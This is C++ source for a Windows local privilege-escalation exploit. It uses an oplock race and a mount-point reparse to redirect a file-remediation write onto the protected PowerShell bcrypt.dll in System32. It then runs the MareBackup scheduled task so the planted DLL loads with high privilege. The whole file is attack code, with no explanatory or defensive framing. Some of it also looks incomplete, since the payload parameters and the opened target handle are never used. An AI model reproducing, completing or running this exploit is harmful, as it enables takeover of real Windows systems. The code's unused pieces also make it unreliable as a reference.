#include <Windows.h>
#include <winioctl.h>
#include <winternl.h>
#include <ktmw32.h>
#include <taskschd.h>

#pragma comment(lib, "ktmw32.lib")
#pragma comment(lib, "taskschd.lib")

#ifndef FSCTL_SET_REPARSE_POINT_EX
#define FSCTL_SET_REPARSE_POINT_EX CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 259, METHOD_BUFFERED, FILE_SPECIAL_ACCESS)
#endif

static const wchar_t protected_dll[] =
    L"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\bcrypt.dll";

void redirect_remediation(HANDLE staged_file, HANDLE staged_directory,
                          HANDLE parent_directory, void *reparse_data,
                          DWORD reparse_data_size, const BYTE *payload,
                          DWORD payload_size) {
    OVERLAPPED oplock_event = {};
    oplock_event.hEvent = CreateEventW(nullptr, FALSE, FALSE, nullptr);

    REQUEST_OPLOCK_INPUT_BUFFER request = {};
    request.StructureLength = sizeof(request);
    request.StructureVersion = REQUEST_OPLOCK_CURRENT_VERSION;
    request.RequestedOplockLevel =
        OPLOCK_LEVEL_CACHE_READ | OPLOCK_LEVEL_CACHE_HANDLE;
    request.Flags = REQUEST_OPLOCK_INPUT_FLAG_REQUEST;

    REQUEST_OPLOCK_OUTPUT_BUFFER response = {};
    response.StructureLength = sizeof(response);
    response.StructureVersion = REQUEST_OPLOCK_CURRENT_VERSION;
    DWORD returned = 0;
    DeviceIoControl(staged_file, FSCTL_REQUEST_OPLOCK, &request, sizeof(request),
                    &response, sizeof(response), &returned, &oplock_event);
    WaitForSingleObject(oplock_event.hEvent, INFINITE);

    FILE_DISPOSITION_INFO_EX disposition = {};
    disposition.Flags = FILE_DISPOSITION_FLAG_DELETE |
                        FILE_DISPOSITION_FLAG_POSIX_SEMANTICS;
    IO_STATUS_BLOCK io = {};
    NtSetInformationFile(staged_directory, &io, &disposition,
                         sizeof(disposition),
                         static_cast<FILE_INFORMATION_CLASS>(64));

    auto *mount = static_cast<REPARSE_DATA_BUFFER *>(reparse_data);
    mount->ReparseTag = IO_REPARSE_TAG_MOUNT_POINT;
    DeviceIoControl(parent_directory, FSCTL_SET_REPARSE_POINT_EX,
                    reparse_data, reparse_data_size,
                    nullptr, 0, &returned, nullptr);

    HANDLE transaction = CreateTransaction(nullptr, nullptr, 0, 0, 0, 0, nullptr);
    HANDLE target = CreateFileTransactedW(
        protected_dll, GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL,
        nullptr, transaction, nullptr, nullptr);
    CommitTransaction(transaction);
}

void trigger_privileged_loader() {
    ITaskService *scheduler = nullptr;
    CoCreateInstance(CLSID_TaskScheduler, nullptr, CLSCTX_INPROC_SERVER,
                     IID_ITaskService, reinterpret_cast<void **>(&scheduler));
    scheduler->Connect(_variant_t(), _variant_t(), _variant_t(), _variant_t());

    ITaskFolder *folder = nullptr;
    scheduler->GetFolder(_bstr_t(L"\\Microsoft\\Windows\\Application Experience"),
                         &folder);
    IRegisteredTask *task = nullptr;
    folder->GetTask(_bstr_t(L"MareBackup"), &task);
    IRunningTask *running = nullptr;
    task->Run(_variant_t(), &running);
}
